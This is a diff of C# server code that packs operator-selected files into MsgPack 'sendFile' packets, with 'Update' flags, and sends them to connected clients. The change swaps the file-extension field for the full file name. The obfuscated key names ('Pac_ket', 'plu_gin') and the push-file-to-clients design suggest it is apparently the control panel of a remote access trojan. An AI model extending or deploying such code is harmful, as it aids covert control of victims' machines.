@@ -420,7 +420,7 @@ namespace Server
                     packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                     packet.ForcePathObject("Update").AsString = "false";
                     packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
-                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
@@ -524,7 +524,7 @@ namespace Server
                     packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                     packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
 
-                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                     packet.ForcePathObject("Update").AsString = "true";
 
                     MsgPack msgpack = new MsgPack();
@@ -803,7 +803,7 @@ namespace Server
                                 await Task.Run(() =>
                                 {
                                     packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
-                                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
+                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                     msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                 });
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -1192,7 +1192,7 @@ namespace Server
                         MsgPack packet = new MsgPack();
                         packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                         packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
-                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+                        packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                         packet.ForcePathObject("Update").AsString = "true";
 
                         MsgPack msgpack = new MsgPack();
